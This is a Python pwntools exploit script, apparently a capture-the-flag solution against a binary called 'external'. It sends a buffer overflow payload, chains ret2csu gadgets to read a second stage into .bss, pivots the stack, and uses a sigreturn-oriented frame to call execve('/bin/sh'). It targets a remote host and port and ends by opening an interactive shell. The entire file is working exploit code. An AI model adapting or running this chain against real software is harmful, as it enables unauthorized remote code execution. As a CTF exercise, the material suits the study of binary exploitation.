#!/usr/bin/env python3
from pwn import *

'''
0x00000000004012f3 : pop rdi ; ret
0x00000000004012f1 : pop rsi ; pop r15 ; ret
0x00000000004012ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
'''

def start():
    global p
    if args.REMOTE:
        p = remote('161.97.176.150', 9999)
    else:
        p = elf.process()

def attach_gdb():
    if args.REMOTE or args.NOGDB:
        return
    attach(p, '''
    b *0x40126f
    handle SIGALRM ignore
    continue
    ''')
    input("ATTACHED?")

def ret2csu_payload(addr: int, edi: int, rsi: int, rdx: int):
    payload = csu2
    payload += simple0 + simple1
    payload += p64(edi & 0xffffffff)
    payload += p64(rsi)
    payload += p64(rdx)
    payload += p64(addr)
    payload += csu1
    return payload

pop_rdi = 0x4012f3
pop_rsi_pop_r15 = 0x4012f1
pop_rsp = 0x4012ed
csu1 = p64(0x4012d0)
csu2 = p64(0x4012ea)
bss = 0x4044e0
main_cont = 0x401249
_fini = 0x402e38
simple0 = p64(0)
simple1 = p64(1)
write_syscall = 0x40127c
syscall = 0x401283
# context.binary = elf = ELF('./external')
context.binary = elf = ELF('./external_patched')
libc = elf.libc
start()

# First payload to get registers for read(0, bss, 1024) for stack pivot later
payload = b'A'*88
payload += ret2csu_payload(_fini, 0, bss, 1024) + b'A'*8
payload += simple0 * 6
payload += p64(syscall)
payload += p64(pop_rsp)
payload += p64(bss)

# Sending stage 1 payload
p.recvuntil('> ')
# attach_gdb()
p.send(payload)

# Making a frame sigreturn frame to make life easier to perfrom execve
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = bss
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

# Second payload to set rax to 0xf then srop
payload2 = b'/bin/sh\x00'*3
payload2 += ret2csu_payload(_fini, 1, bss-0x1000, 0xf) + b'A'*8
payload2 += simple0 * 6
payload2 += p64(write_syscall)
payload2 += p64(syscall)
payload2 += bytes(frame)
# payload2 += b'X'*8

# Sending the second payload to read in first payload
p.send(payload2)
# Receiving 0xf grabage bytes for clean prompt
p.recv(0xf)
# We have the shell !!!
p.interactive()
p.close()